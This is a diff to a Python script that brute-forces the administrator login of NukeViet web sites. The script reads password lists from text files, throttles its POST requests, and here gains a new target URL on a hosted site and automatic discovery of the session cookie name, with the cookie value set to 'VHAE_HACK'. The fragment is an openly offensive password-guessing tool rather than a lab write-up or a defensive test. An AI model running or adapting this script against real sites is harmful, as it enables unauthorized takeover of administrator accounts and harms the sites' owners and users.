@@ -5,20 +5,12 @@ import time
 count=0
 def start(count):
 	#---------------------VAR CAN CHANGE-----------------------------------------------
-	user='admin'                                        #change user / default is admin
-	timewait=0.3                                        #time delay post request
-	url = 'http://NUKEVIET.com/admin/'                  #url page login
-	cookiesset="nv3c_Gdbap_sess"                        #cookie set will show in cookie when you connect to web login admin
+	user='admin'                                                            #change user / default is admin
+	timewait=0.3                                                            #time delay post request
+	url = 'https://testnukevhae.000webhostapp.com/zxc/nukeviet/admin/'      #url page login
 	#---------------------VAR CAN CHANGE-----------------------------------------------
 	
 	all_list_try=[]
-	headerss={
-	"Referer": url
-	}
-	cookies={cookiesset:"VHAE_HACK"}
-	
-	
-	
 	file_pw = open("listpw.txt","r",encoding="utf8")
 	file_pw_try = open("list_pass_trylogin.txt", "r",encoding="utf8")
 
@@ -27,8 +19,13 @@ def start(count):
 	x = pw_raw.split()
 	y = pw_try_list.split()
 
-	
-	# :)) not thing code
+	cookie_sess=(requests.post(url).headers["Set-Cookie"].split("=")[0])
+
+	headerss={
+	"Referer": url
+	}
+	cookies={cookie_sess:"VHAE_HACK"}
+
 	print("WE NEED LOGIN WITH " + str(len(pw_raw.split()) - len(y)) +" PW")
 
 	
